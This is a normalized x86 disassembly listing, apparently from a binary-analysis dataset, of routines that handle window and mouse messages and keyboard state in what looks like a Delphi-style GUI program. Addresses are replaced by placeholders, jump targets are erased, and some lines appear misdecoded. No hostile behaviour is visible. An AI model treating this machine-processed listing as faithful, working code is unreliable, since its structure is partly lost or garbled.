call sub_490e18
pop ebx
retn
sub_48f3dc
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
xor edx edx
mov eax esi
call sub_477028
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x109
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov dl 0x1
mov eax esi
call sub_477028
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x2a8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_48db1c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x104 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
add eax 0xfffffe00
cmp eax 0x7
ja r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_48f4b5 ]
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_48327c
jmp r-xdata
test [ esi + 0x52 ] 0x8
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x54 ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4483f8
jmp r-xdata
lea eax [ ebp - 0x115 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x115 ]
call sub_476f28
mov [ ebp - 0xc ] al
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov edi [ ebx + 0x8 ]
mov edx edi
shr edx 0x10
mov eax edi
and eax 0xffff
call sub_432a64
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4483f8
jmp r-xdata
mov eax [ rw-data ]
call sub_49be14
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_49bd94
mov [ ebp - 0x15 ] 0x0
mov eax [ rw-data ]
mov edi [ eax + 0x28 ]
test edi edi
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4833c4
jmp r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax esi
call sub_496868
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe4 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_49bee0
jmp r-xdata
xor edx edx
mov eax esi
call sub_477028
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
call sub_496868
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe4 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_496868
mov edx eax
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe4 ]
mov [ ebp - 0x15 ] al
sub_48f6c0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_436418
mov edi eax
mov eax [ esi + 0x16c ]
call sub_436444
mov [ esi + 0x16c ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_48db1c
dec eax
je r-xdata
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x16c ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_436110
call sub_4360a4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4360a4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_48f774
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_48f7a8
push ebp
mov ebp esp
push ebx
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x18c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x190 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x190 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x194 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x194 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x44 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x198 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x198 ]
jne r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x194 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub_48f9c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
mov eax [ ebx ]
push eax
push r-xdata
mov eax [ ebx ]
push eax
push sub_48f768
push ebp
call sub_48f774
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_490ed4
mov eax [ ebx ]
push eax
push sub_490e6c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
xor ecx ecx
jmp r-xdata
push ebp
xor eax eax
call sub_48f7a8
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_490ea4
mov eax [ ebx ]
push eax
push sub_490e4c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x1
call sub_48f7a8
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_490e7c
mov eax [ ebx ]
push eax
push sub_490e94
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x2
call sub_48f7a8
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_490ebc
mov eax [ ebx ]
push eax
push sub_490e5c
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x3
call sub_48f7a8
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
sub_48fba8
push ebx
mov ebx eax
cmp [ ebx + 0x112 ] 0x0
je r-xdata
xor eax eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x110 ]
sete al
xor al 0x1
jmp r-xdata
cmp [ ebx + 0x112 ] 0x0
je r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
mov edx ebx
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
sub_48fc40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_48fc78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_48f17c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4483f8
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4483f8
sub_48fcfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_48daec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_48e1e8
movzx eax [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_48fc78
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_48fd48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_48daec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_48fd64
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_48daec
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_48e1e8
movzx eax [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_48fc78
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffea
call sub_4483f8
sub_48fdbc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_48f11c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_48f0b0
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_48f11c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_48fe58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_48fc78
pop esi
pop ebx
retn
sub_48fe81
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_48fc78
pop esi
pop ebx
retn
sub_48fea9
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_48fc78
pop esi
pop ebx
retn
sub_48fed9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_48fc78
pop esi
pop ebx
retn
sub_48ff08
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_48ff3c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_48f17c
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4483f8
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4483f8
sub_48ffb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_48ffec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4483f8
sub_490024
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_48e1e8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_48ffec
add esp 0x1c
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
lea edx [ esp + 0x4 ]
call sub_432a8c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4483f8
sub_4900a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_48ffec
pop esi
pop ebx
retn
sub_4900c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_48ffec
pop esi
pop ebx
retn
sub_4900e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x4 ]
call sub_476e90
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4483f8
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_49bf08
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_49013c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_48e1d8
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_48e1e8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_48f2b0
pop esi
retn
sub_49017c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x70 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_48f334
sub_49022a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_48e438
mov cl 0x1
sub_490278
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x6c ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x6c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x5a ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0xb00d
call sub_48f2b0
sub_4902b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x6c ]
call sub_490278
pop ecx
push ebp
mov eax [ edx + 0x8 ]
call sub_490278
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5a ] 0x1
sub_4902ec
push esi
push edi
mov esi eax
cmp [ esi + 0x60 ] 0x0
je r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
mov [ esi + 0x60 ] 0x1
movzx edx [ edi + 0x5f ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_490310
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push eax
movsx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x4 ]
mov eax edi
mov si 0xffe3
call sub_4483f8
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_48f2b0
mov [ ebx + 0xc ] eax
sub_49039c
push ebx
mov ebx eax
cmp [ ebx + 0x8a ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
mov edx [ ebx + 0x30 ]
test [ edx + 0x1c ] 0x10
setne dl
cmp al dl
jne r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x89 ]
mov eax ebx
call sub_48e0c0
mov [ ebx + 0x8a ] 0x1
sub_4903d8
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x64 ]
mov eax ebx
call sub_48e064
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_48e064
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_490430
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb013
call sub_48f2b0
pop esi
pop ebx
retn
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebx + 0x89 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_48f30c
test eax eax
je r-xdata
mov eax ebx
call sub_48f30c
mov edx ebx
call sub_49d140
sub_490494
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb014
call sub_48f2b0
pop esi
pop ebx
retn
cmp [ ebx + 0x132 ] 0x0
je r-xdata
cmp [ ebx + 0x89 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_48f30c
test eax eax
je r-xdata
mov eax ebx
call sub_48f30c
mov edx ebx
call sub_49cef8
sub_490500
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
